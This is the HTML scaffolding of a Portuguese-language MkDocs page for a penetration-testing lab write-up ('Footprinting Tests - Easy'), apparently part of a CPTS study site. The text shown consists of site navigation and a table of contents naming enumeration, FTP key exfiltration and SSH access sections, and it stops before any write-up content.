@@ -1,0 +1,2177 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups do curso preparatório CPTS">
+      
+      
+        <meta name="author" content="Matheus Navarro de Franca">
+      
+      
+        <link rel="canonical" href="https://thewzz.github.io/cpts-writeups/machines/footprinting-tests-easy/">
+      
+      
+        <link rel="prev" href="../redeemer/">
+      
+      
+        <link rel="next" href="../footprinting-tests-medium/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Footprinting Tests - Easy - CPTS Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/home.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#footprinting-tests-easy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="CPTS Writeups" class="md-header__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CPTS Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Footprinting Tests - Easy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CPTS Writeups" class="md-nav__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CPTS Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Máquinas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Máquinas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Índice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concluídos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Concluídos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_1" id="__nav_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Easy
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comando-de-enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comando de Enumeração
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#saida-relevante-evidencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Saída Relevante (evidência)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Processo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-chave" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comandos-Chave
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidencia-exfiltracao-da-chave-via-ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidência — exfiltração da chave via FTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tentativas-que-nao-funcionaram" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tentativas que NÃO funcionaram
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usuarios-encontrados-home" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usuários encontrados (/home)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credenciais-chaves-encontradas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credenciais / Chaves Encontradas
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidencia-acesso-ssh-e-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidência — acesso SSH e flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_2" id="__nav_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-medium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Medium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_3" id="__nav_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hard
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-hard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Hard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Em Andamento
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Em Andamento
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3_1" id="__nav_1_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../silentium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silentium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../facts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Facts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anotações
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Anotações
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Estudos Footprinting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Estudos Footprinting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smb-client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB Client
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/oracle-tns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ORACLE TNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/ipmi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IPMI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comando-de-enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comando de Enumeração
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#saida-relevante-evidencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Saída Relevante (evidência)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Processo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-chave" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comandos-Chave
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidencia-exfiltracao-da-chave-via-ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidência — exfiltração da chave via FTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tentativas-que-nao-funcionaram" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tentativas que NÃO funcionaram
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#usuarios-encontrados-home" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Usuários encontrados (/home)
+      
+    </span>
+  </a>
+  
+</li>
+        
